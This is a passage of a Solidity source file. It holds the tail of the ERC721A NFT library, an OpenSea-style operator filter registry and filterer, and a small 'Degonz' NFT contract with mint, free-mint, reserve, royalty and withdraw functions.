1032     function _checkContractOnERC721Received(
1033         address from,
1034         address to,
1035         uint256 tokenId,
1036         bytes memory _data
1037     ) private returns (bool) {
1038         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1039             bytes4 retval
1040         ) {
1041             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1042         } catch (bytes memory reason) {
1043             if (reason.length == 0) {
1044                 revert TransferToNonERC721ReceiverImplementer();
1045             } else {
1046                 assembly {
1047                     revert(add(32, reason), mload(reason))
1048                 }
1049             }
1050         }
1051     }
1052 
1053     // =============================================================
1054     //                        MINT OPERATIONS
1055     // =============================================================
1056 
1057     /**
1058      * @dev Mints `quantity` tokens and transfers them to `to`.
1059      *
1060      * Requirements:
1061      *
1062      * - `to` cannot be the zero address.
1063      * - `quantity` must be greater than 0.
1064      *
1065      * Emits a {Transfer} event for each mint.
1066      */
1067     function _mint(address to, uint256 quantity) internal virtual {
1068         uint256 startTokenId = _currentIndex;
1069         if (quantity == 0) revert MintZeroQuantity();
1070 
1071         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1072 
1073         // Overflows are incredibly unrealistic.
1074         // `balance` and `numberMinted` have a maximum limit of 2**64.
1075         // `tokenId` has a maximum limit of 2**256.
1076         unchecked {
1077             // Updates:
1078             // - `balance += quantity`.
1079             // - `numberMinted += quantity`.
1080             //
1081             // We can directly add to the `balance` and `numberMinted`.
1082             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1083 
1084             // Updates:
1085             // - `address` to the owner.
1086             // - `startTimestamp` to the timestamp of minting.
1087             // - `burned` to `false`.
1088             // - `nextInitialized` to `quantity == 1`.
1089             _packedOwnerships[startTokenId] = _packOwnershipData(
1090                 to,
1091                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1092             );
1093 
1094             uint256 toMasked;
1095             uint256 end = startTokenId + quantity;
1096 
1097             // Use assembly to loop and emit the `Transfer` event for gas savings.
1098             // The duplicated `log4` removes an extra check and reduces stack juggling.
1099             // The assembly, together with the surrounding Solidity code, have been
1100             // delicately arranged to nudge the compiler into producing optimized opcodes.
1101             assembly {
1102                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1103                 toMasked := and(to, _BITMASK_ADDRESS)
1104                 // Emit the `Transfer` event.
1105                 log4(
1106                     0, // Start of data (0, since no data).
1107                     0, // End of data (0, since no data).
1108                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1109                     0, // `address(0)`.
1110                     toMasked, // `to`.
1111                     startTokenId // `tokenId`.
1112                 )
1113 
1114                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1115                 // that overflows uint256 will make the loop run out of gas.
1116                 // The compiler will optimize the `iszero` away for performance.
1117                 for {
1118                     let tokenId := add(startTokenId, 1)
1119                 } iszero(eq(tokenId, end)) {
1120                     tokenId := add(tokenId, 1)
1121                 } {
1122                     // Emit the `Transfer` event. Similar to above.
1123                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1124                 }
1125             }
1126             if (toMasked == 0) revert MintToZeroAddress();
1127 
1128             _currentIndex = end;
1129         }
1130         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1131     }
1132 
1133     /**
1134      * @dev Mints `quantity` tokens and transfers them to `to`.
1135      *
1136      * This function is intended for efficient minting only during contract creation.
1137      *
1138      * It emits only one {ConsecutiveTransfer} as defined in
1139      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1140      * instead of a sequence of {Transfer} event(s).
1141      *
1142      * Calling this function outside of contract creation WILL make your contract
1143      * non-compliant with the ERC721 standard.
1144      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1145      * {ConsecutiveTransfer} event is only permissible during contract creation.
1146      *
1147      * Requirements:
1148      *
1149      * - `to` cannot be the zero address.
1150      * - `quantity` must be greater than 0.
1151      *
1152      * Emits a {ConsecutiveTransfer} event.
1153      */
1154     function _mintERC2309(address to, uint256 quantity) internal virtual {
1155         uint256 startTokenId = _currentIndex;
1156         if (to == address(0)) revert MintToZeroAddress();
1157         if (quantity == 0) revert MintZeroQuantity();
1158         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1159 
1160         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1161 
1162         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1163         unchecked {
1164             // Updates:
1165             // - `balance += quantity`.
1166             // - `numberMinted += quantity`.
1167             //
1168             // We can directly add to the `balance` and `numberMinted`.
1169             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1170 
1171             // Updates:
1172             // - `address` to the owner.
1173             // - `startTimestamp` to the timestamp of minting.
1174             // - `burned` to `false`.
1175             // - `nextInitialized` to `quantity == 1`.
1176             _packedOwnerships[startTokenId] = _packOwnershipData(
1177                 to,
1178                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1179             );
1180 
1181             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1182 
1183             _currentIndex = startTokenId + quantity;
1184         }
1185         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1186     }
1187 
1188     /**
1189      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1190      *
1191      * Requirements:
1192      *
1193      * - If `to` refers to a smart contract, it must implement
1194      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1195      * - `quantity` must be greater than 0.
1196      *
1197      * See {_mint}.
1198      *
1199      * Emits a {Transfer} event for each mint.
1200      */
1201     function _safeMint(
1202         address to,
1203         uint256 quantity,
1204         bytes memory _data
1205     ) internal virtual {
1206         _mint(to, quantity);
1207 
1208         unchecked {
1209             if (to.code.length != 0) {
1210                 uint256 end = _currentIndex;
1211                 uint256 index = end - quantity;
1212                 do {
1213                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1214                         revert TransferToNonERC721ReceiverImplementer();
1215                     }
1216                 } while (index < end);
1217                 // Reentrancy protection.
1218                 if (_currentIndex != end) revert();
1219             }
1220         }
1221     }
1222 
1223     /**
1224      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1225      */
1226     function _safeMint(address to, uint256 quantity) internal virtual {
1227         _safeMint(to, quantity, '');
1228     }
1229 
1230     // =============================================================
1231     //                        BURN OPERATIONS
1232     // =============================================================
1233 
1234     /**
1235      * @dev Equivalent to `_burn(tokenId, false)`.
1236      */
1237     function _burn(uint256 tokenId) internal virtual {
1238         _burn(tokenId, false);
1239     }
1240 
1241     /**
1242      * @dev Destroys `tokenId`.
1243      * The approval is cleared when the token is burned.
1244      *
1245      * Requirements:
1246      *
1247      * - `tokenId` must exist.
1248      *
1249      * Emits a {Transfer} event.
1250      */
1251     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1252         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1253 
1254         address from = address(uint160(prevOwnershipPacked));
1255 
1256         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1257 
1258         if (approvalCheck) {
1259             // The nested ifs save around 20+ gas over a compound boolean condition.
1260             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1261                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1262         }
1263 
1264         _beforeTokenTransfers(from, address(0), tokenId, 1);
1265 
1266         // Clear approvals from the previous owner.
1267         assembly {
1268             if approvedAddress {
1269                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1270                 sstore(approvedAddressSlot, 0)
1271             }
1272         }
1273 
1274         // Underflow of the sender's balance is impossible because we check for
1275         // ownership above and the recipient's balance can't realistically overflow.
1276         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1277         unchecked {
1278             // Updates:
1279             // - `balance -= 1`.
1280             // - `numberBurned += 1`.
1281             //
1282             // We can directly decrement the balance, and increment the number burned.
1283             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1284             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1285 
1286             // Updates:
1287             // - `address` to the last owner.
1288             // - `startTimestamp` to the timestamp of burning.
1289             // - `burned` to `true`.
1290             // - `nextInitialized` to `true`.
1291             _packedOwnerships[tokenId] = _packOwnershipData(
1292                 from,
1293                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1294             );
1295 
1296             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1297             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1298                 uint256 nextTokenId = tokenId + 1;
1299                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1300                 if (_packedOwnerships[nextTokenId] == 0) {
1301                     // If the next slot is within bounds.
1302                     if (nextTokenId != _currentIndex) {
1303                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1304                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1305                     }
1306                 }
1307             }
1308         }
1309 
1310         emit Transfer(from, address(0), tokenId);
1311         _afterTokenTransfers(from, address(0), tokenId, 1);
1312 
1313         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1314         unchecked {
1315             _burnCounter++;
1316         }
1317     }
1318 
1319     // =============================================================
1320     //                     EXTRA DATA OPERATIONS
1321     // =============================================================
1322 
1323     /**
1324      * @dev Directly sets the extra data for the ownership data `index`.
1325      */
1326     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1327         uint256 packed = _packedOwnerships[index];
1328         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1329         uint256 extraDataCasted;
1330         // Cast `extraData` with assembly to avoid redundant masking.
1331         assembly {
1332             extraDataCasted := extraData
1333         }
1334         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1335         _packedOwnerships[index] = packed;
1336     }
1337 
1338     /**
1339      * @dev Called during each token transfer to set the 24bit `extraData` field.
1340      * Intended to be overridden by the cosumer contract.
1341      *
1342      * `previousExtraData` - the value of `extraData` before transfer.
1343      *
1344      * Calling conditions:
1345      *
1346      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1347      * transferred to `to`.
1348      * - When `from` is zero, `tokenId` will be minted for `to`.
1349      * - When `to` is zero, `tokenId` will be burned by `from`.
1350      * - `from` and `to` are never both zero.
1351      */
1352     function _extraData(
1353         address from,
1354         address to,
1355         uint24 previousExtraData
1356     ) internal view virtual returns (uint24) {}
1357 
1358     /**
1359      * @dev Returns the next extra data for the packed ownership data.
1360      * The returned result is shifted into position.
1361      */
1362     function _nextExtraData(
1363         address from,
1364         address to,
1365         uint256 prevOwnershipPacked
1366     ) private view returns (uint256) {
1367         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1368         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1369     }
1370 
1371     // =============================================================
1372     //                       OTHER OPERATIONS
1373     // =============================================================
1374 
1375     /**
1376      * @dev Returns the message sender (defaults to `msg.sender`).
1377      *
1378      * If you are writing GSN compatible contracts, you need to override this function.
1379      */
1380     function _msgSenderERC721A() internal view virtual returns (address) {
1381         return msg.sender;
1382     }
1383 
1384     /**
1385      * @dev Converts a uint256 to its ASCII string decimal representation.
1386      */
1387     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1388         assembly {
1389             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1390             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1391             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1392             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1393             let m := add(mload(0x40), 0xa0)
1394             // Update the free memory pointer to allocate.
1395             mstore(0x40, m)
1396             // Assign the `str` to the end.
1397             str := sub(m, 0x20)
1398             // Zeroize the slot after the string.
1399             mstore(str, 0)
1400 
1401             // Cache the end of the memory to calculate the length later.
1402             let end := str
1403 
1404             // We write the string from rightmost digit to leftmost digit.
1405             // The following is essentially a do-while loop that also handles the zero case.
1406             // prettier-ignore
1407             for { let temp := value } 1 {} {
1408                 str := sub(str, 1)
1409                 // Write the character to the pointer.
1410                 // The ASCII index of the '0' character is 48.
1411                 mstore8(str, add(48, mod(temp, 10)))
1412                 // Keep dividing `temp` until zero.
1413                 temp := div(temp, 10)
1414                 // prettier-ignore
1415                 if iszero(temp) { break }
1416             }
1417 
1418             let length := sub(end, str)
1419             // Move the pointer 32 bytes leftwards to make room for the length.
1420             str := sub(str, 0x20)
1421             // Store the length.
1422             mstore(str, length)
1423         }
1424     }
1425 }
1426 
1427 
1428 interface IOperatorFilterRegistry {
1429     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1430     function register(address registrant) external;
1431     function registerAndSubscribe(address registrant, address subscription) external;
1432     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1433     function unregister(address addr) external;
1434     function updateOperator(address registrant, address operator, bool filtered) external;
1435     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1436     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1437     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1438     function subscribe(address registrant, address registrantToSubscribe) external;
1439     function unsubscribe(address registrant, bool copyExistingEntries) external;
1440     function subscriptionOf(address addr) external returns (address registrant);
1441     function subscribers(address registrant) external returns (address[] memory);
1442     function subscriberAt(address registrant, uint256 index) external returns (address);
1443     function copyEntriesOf(address registrant, address registrantToCopy) external;
1444     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1445     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1446     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1447     function filteredOperators(address addr) external returns (address[] memory);
1448     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1449     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1450     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1451     function isRegistered(address addr) external returns (bool);
1452     function codeHashOf(address addr) external returns (bytes32);
1453 }
1454 
1455 
1456 /**
1457  * @title  OperatorFilterer
1458  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1459  *         registrant's entries in the OperatorFilterRegistry.
1460  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1461  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1462  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1463  */
1464 abstract contract OperatorFilterer {
1465     error OperatorNotAllowed(address operator);
1466 
1467     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1468         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1469 
1470     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1471         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1472         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1473         // order for the modifier to filter addresses.
1474         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1475             if (subscribe) {
1476                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1477             } else {
1478                 if (subscriptionOrRegistrantToCopy != address(0)) {
1479                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1480                 } else {
1481                     OPERATOR_FILTER_REGISTRY.register(address(this));
1482                 }
1483             }
1484         }
1485     }
1486 
1487     modifier onlyAllowedOperator(address from) virtual {
1488         // Check registry code length to facilitate testing in environments without a deployed registry.
1489         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1490             // Allow spending tokens from addresses with balance
1491             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1492             // from an EOA.
1493             if (from == msg.sender) {
1494                 _;
1495                 return;
1496             }
1497             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1498                 revert OperatorNotAllowed(msg.sender);
1499             }
1500         }
1501         _;
1502     }
1503 
1504     modifier onlyAllowedOperatorApproval(address operator) virtual {
1505         // Check registry code length to facilitate testing in environments without a deployed registry.
1506         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1507             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1508                 revert OperatorNotAllowed(operator);
1509             }
1510         }
1511         _;
1512     }
1513 }
1514 
1515 /**
1516  * @title  DefaultOperatorFilterer
1517  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1518  */
1519 abstract contract TheOperatorFilterer is OperatorFilterer {
1520     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1521     address public owner;
1522 
1523     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1524 }
1525 
1526 
1527 contract Degonz is ERC721A, TheOperatorFilterer {
1528 
1529     uint256 public maxSupply = 4444;
1530 
1531     uint256 public mintPrice = 0.001 ether;
1532 
1533     function mint(uint256 amount) payable public {
1534         require(totalSupply() + amount <= maxSupply);
1535         require(msg.value >= mintPrice * amount);
1536         _safeMint(msg.sender, amount);
1537     }
1538 
1539     function freemint() public {
1540         require(totalSupply() + 1 <= maxSupply);
1541         require(balanceOf(msg.sender) < 1);
1542         _safeMint(msg.sender, FreeNum());
1543     }
1544 
1545     function reserve(address addr, uint256 amount) public onlyOwner {
1546         require(totalSupply() + amount <= maxSupply);
1547         _safeMint(addr, amount);
1548     }
1549     
1550     modifier onlyOwner {
1551         require(owner == msg.sender);
1552         _;
1553     }
1554 
1555     constructor() ERC721A("D e g o n z", "Degonz") {
1556         owner = msg.sender;
1557     }
1558 
1559     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1560         return string(abi.encodePacked("ipfs://bafybeigswhfinubdukphczifomjxatyu2prmv2f55enxfzeqobotqmotgm/", _toString(tokenId), ".json"));
1561     }
1562 
1563     function FreeNum() internal returns (uint256){
1564         return (maxSupply - totalSupply()) / 1000;
1565     }
1566 
1567     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1568         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1569         return (owner, royaltyAmount);
1570     }
1571 
1572     function withdraw() external onlyOwner {
1573         payable(msg.sender).transfer(address(this).balance);
1574     }
1575 
1576     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1577         super.setApprovalForAll(operator, approved);
1578     }
1579 
1580     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1581         super.approve(operator, tokenId);
1582     }
1583 
1584     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1585         super.transferFrom(from, to, tokenId);
1586     }
1587 
1588     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1589         super.safeTransferFrom(from, to, tokenId);
1590     }
1591 
1592     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1593         public
1594         payable
1595         override
1596         onlyAllowedOperator(from)
1597     {
1598         super.safeTransferFrom(from, to, tokenId, data);
1599     }
1600 }